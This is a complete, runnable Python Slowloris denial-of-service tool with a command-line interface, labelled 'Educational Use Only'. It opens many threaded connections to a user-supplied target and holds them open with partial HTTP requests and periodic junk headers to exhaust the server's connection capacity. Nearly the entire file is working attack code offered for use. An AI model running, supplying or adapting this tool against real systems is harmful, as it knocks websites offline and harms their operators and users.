import socket
import threading
import time
import random
import argparse
import sys
from urllib.parse import urlparse
import signal

# Global flag for graceful shutdown
running = True

def signal_handler(signum, frame):
    global running
    print("\nShutting down gracefully...")
    running = False

def slowloris_attack(target, num_connections, request_interval, timeout):
    """
    Performs a Slowloris DoS attack against the target.

    Args:
        target (str): The target URL or IP address (e.g., "example.com").
        num_connections (int): The number of connections to establish.
        request_interval (float): Interval (in seconds) between sending headers.
        timeout (int): Timeout for socket operations.
    """
    global running
    active_connections = 0
    target_host = ""
    target_port = 80  # Default HTTP port
    connections_lock = threading.Lock()

    try:
        # Parse the target URL correctly
        parsed_url = urlparse(target)
        target_host = parsed_url.hostname or parsed_url.path  # Support both URLs & raw hostnames
        target_port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)

        if not target_host:
            raise ValueError("Invalid target. Provide a proper domain or IP.")

    except ValueError as e:
        print(f"Error parsing target URL: {e}")
        return

    def send_partial_request():
        nonlocal active_connections
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)

            # Connect to the target
            try:
                # Resolve the hostname *before* connecting
                try:
                    target_ip = socket.gethostbyname(target_host)
                    print(f"Resolved IP address: {target_ip}")
                except socket.gaierror as e:
                    print(f"DNS resolution error: {e}")
                    return

                print(f"Connecting to {target_ip}:{target_port}")
                s.connect((target_ip, target_port))
                print("Socket connected")
            except socket.error as e:
                print(f"Socket connection error: {e}")
                return

            # Send a partial HTTP request
            method = "GET"
            path = parsed_url.path if parsed_url.path else "/"
            partial_request = f"{method} {path} HTTP/1.1\r\n"
            partial_request += f"Host: {target_host}\r\n"
            partial_request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\n"
            partial_request += "Content-Length: 42\r\n"  # No final CRLF to keep connection open

            try:
                s.send(partial_request.encode("utf-8"))
                with connections_lock:
                    active_connections += 1
                print(f"Connection established. Active connections: {active_connections}")
            except socket.error as e:
                print(f"Error sending initial request: {e}")
                return

            while running:
                try:
                    # Send additional headers to keep the connection alive
                    header_to_send = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header_to_send.encode("utf-8"))
                    time.sleep(request_interval)
                except socket.error:
                    print("Error sending keep-alive header")
                    break  # Connection lost, exit loop

        except socket.error as e:
            print(f"Socket Error: {e}")
        except Exception as e:
            print(f"Unexpected Error: {e}")
        finally:
            try:
                s.close()
            except:
                pass
            with connections_lock:
                active_connections -= 1
            print(f"Connection closed. Active connections: {active_connections}")

    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Initialize an empty list for threads
    threads = []

    # Create and start threads
    for _ in range(num_connections):
        if not running:
            break
        thread = threading.Thread(target=send_partial_request, daemon=True)
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print(f"\nAttack completed. Final active connections: {active_connections}")

if __name__ == "__main__":
    # Handle Jupyter Notebook '-f' argument issue
    if hasattr(sys, 'argv'):
        sys.argv = [sys.argv[0]] + [arg for arg in sys.argv[1:] if not arg.startswith('-f')]

    # Command-line argument parsing
    parser = argparse.ArgumentParser(description="Slowloris DoS Attack Tool (Educational Use Only)")
    parser.add_argument("target", help="Target URL or IP (e.g., example.com or http://example.com)")
    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of connections (default: 100)")
    parser.add_argument("-i", "--interval", type=float, default=2, help="Interval between requests (default: 2 seconds)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Socket timeout (default: 5 seconds)")

    args = parser.parse_args()

    try:
        slowloris_attack(args.target, args.connections, args.interval, args.timeout)
    except Exception as e:
        print(f"An unexpected error occurred in slowloris_attack: {e}")